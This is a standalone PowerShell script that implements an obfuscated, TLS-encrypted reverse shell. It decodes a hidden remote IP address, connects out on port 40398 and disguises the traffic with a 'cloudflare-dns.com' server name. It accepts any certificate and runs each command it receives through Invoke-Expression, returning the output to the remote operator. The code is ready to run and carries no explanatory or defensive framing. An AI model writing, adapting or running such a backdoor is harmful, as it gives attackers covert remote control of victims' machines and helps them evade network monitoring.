$Active = 1; 


if ($Active -ne 1) { exit }


try {
    $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
    
    
    $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TVRRMkxqY3dMakkwTUM0eU1EVT0=')))));
    $port = 40398;

    $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
    $NetworkStream = $TCPClient.GetStream();
    
    
    $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
    $SslStream.AuthenticateAsClient(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y2xvdWRmbGFyZS1kbnMuY29t'))), $null, $sslProtocols, $false);

    if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
        $SslStream.Close();
        exit;
    }

    $StreamWriter = New-Object IO.StreamWriter($SslStream);
    $StreamWriter.AutoFlush = $true;

    # Function to format the shell prompt
    function WriteToStream ($String) {
        [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
        $StreamWriter.Write($String + (-join([char]0x50, [char]0x53, [char]0x20)) + (Get-Location).Path + (-join([char]0x3E, [char]0x20)));
    };

    WriteToStream '';

    
    while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1).Trim();
        
        if ($Command -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhpdA==')))) { break }
        
        $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
        
        WriteToStream ($Output);
    }

    $StreamWriter.Close();
    $TCPClient.Close();
} catch {
    
    exit;
}
